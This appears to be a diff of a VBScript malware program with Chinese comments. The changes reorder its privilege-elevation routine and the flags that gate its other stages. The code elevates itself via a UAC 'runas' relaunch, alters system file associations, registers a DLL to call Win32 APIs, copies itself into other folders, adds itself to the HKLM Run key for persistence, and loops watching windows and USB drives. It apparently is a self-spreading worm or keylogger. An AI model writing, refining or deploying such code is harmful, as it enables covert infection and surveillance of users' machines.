@@ -33,33 +33,6 @@ Sub CheckOpenWithLnk()
 	End If
 End Sub
 
-'************************************* 提升脚本运行权限 **************************************
-
-Dim g_isRunningWithoutUAC '是否提升过权限
-g_isRunningWithoutUAC = False
-
-Call DoUACRunScript()
-
-Sub DoUACRunScript()
-	If g_isRunningWithLnk Then 
-		g_isRunningWithoutUAC = True
-		Exit Sub
-	End If
-	Dim objOS
-	For Each objOS in GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem") 
-		If InStr(objOS.Caption, "XP") = 0 Then 
-			If WScript.Arguments.Count = 0 Then
-				Dim objShell
-				Set objShell = CreateObject("Shell.Application")
-				objShell.ShellExecute "WScript.exe", Chr(34) &_
-				WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
-				Set objShell = Nothing
-				g_isRunningWithoutUAC = True
-			End If
-		End If
-	Next
-End Sub
-
 '************************************* 强制程序以32位启动 ************************************
 
 Const DEFAULT_VBS_OPEN_COMMAND_KEY	= "HKLM\SOFTWARE\Classes\vbsfile\shell\open\command\"
@@ -71,7 +44,7 @@ g_isRunningOnX86 = False
 Call OpenWithX86()
 
 Sub OpenWithX86() '主函数，强制程序以32位WScript.exe解释执行
-	If g_isRunningWithoutUAC = True Then Exit Sub
+	If g_isRunningWithLnk Then Exit Sub
 	If X86orX64() = "X64" Then
 		If ReadReg(DEFAULT_VBS_OPEN_COMMAND_KEY) <> CUSTOM_VBS_OPEN_COMMAND_VALUE Then
 			Call SetVbsFileAss()	'改变vbs格式文件关联
@@ -100,12 +73,39 @@ Function X86orX64() '判断是X86架构还是X64架构
 	End if
 End Function
 
+'************************************* 提升脚本运行权限 **************************************
+
+Dim g_isRunningWithoutUAC '是否提升过权限
+g_isRunningWithoutUAC = False
+
+Call DoUACRunScript()
+
+Sub DoUACRunScript()
+	If g_isRunningOnX86 = False Then
+		g_isRunningWithoutUAC = True
+		Exit Sub
+	End If
+	Dim objOS
+	For Each objOS in GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem") 
+		If InStr(objOS.Caption, "XP") = 0 Then 
+			If WScript.Arguments.Count = 0 Then
+				Dim objShell
+				Set objShell = CreateObject("Shell.Application")
+				objShell.ShellExecute "WScript.exe", Chr(34) &_
+				WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
+				Set objShell = Nothing
+				g_isRunningWithoutUAC = True
+			End If
+		End If
+	Next
+End Sub
+
 '******************************* 注册Dynamic Wrapper DLL ********************************
 
 Call RegisterDynamicWrapperDLL()	'注册Dynamic Wrapper DLL
 
 Sub RegisterDynamicWrapperDLL()		'注册Dynamic Wrapper DLL
-	If g_isRunningOnX86 = False Then Exit Sub
+	If g_isRunningWithoutUAC = False Then Exit Sub
 	Dim strDllPath
 	strDllPath = Replace(WScript.ScriptFullName, WScript.ScriptName, DYN_WRAP_DLL)	'获取DLL文件的绝对路径
 	Call RegisterCOM(strDllPath)	'注册DynamicWrapper组件
@@ -146,7 +146,7 @@ Dim g_objConnectAPI
 Call ConfigureWin32API()
 
 Sub ConfigureWin32API
-	If g_isRunningOnX86 = False Then Exit Sub
+	If g_isRunningWithoutUAC = False Then Exit Sub
 	Set g_objConnectAPI = WScript.CreateObject("DynamicWrapper") '创建全局的DynamicWrapper组件对象实例
 	With g_objConnectAPI '以下为声明将要用到的Win32API函数
 		.Register "user32.dll", "FindWindow", "i=ss", "f=s", "r=l"
@@ -181,7 +181,7 @@ End Sub
 Call Propagate(GetPropagateTragetFolder)
 
 Sub Propagate(targetPath) '复制自身到指定文件夹
-	If g_isRunningOnX86 = False Then Exit Sub
+	If g_isRunningWithoutUAC = False Then Exit Sub
 	Dim objFileSystem
 	Set objFileSystem = WScript.CreateObject("Scripting.FileSystemObject")
 	
@@ -223,7 +223,7 @@ End Function
 Call ConfigureAutoRun()
 
 Sub ConfigureAutoRun()
-	If g_isRunningOnX86 = False Then Exit Sub
+	If g_isRunningWithoutUAC = False Then Exit Sub
 	Dim objFileSystem
 	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
 	Const REG_PATH = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\"	'开机启动的注册表地址
@@ -244,7 +244,7 @@ g_theKeyResult = ""
 Call Main()
 
 Sub Main()
-	If g_isRunningOnX86 = False Then Exit Sub
+	If g_isRunningWithoutUAC = False Then Exit Sub
 	Dim loopCount
 	loopCount = 0
 	Do '循环监视指定窗口和U盘
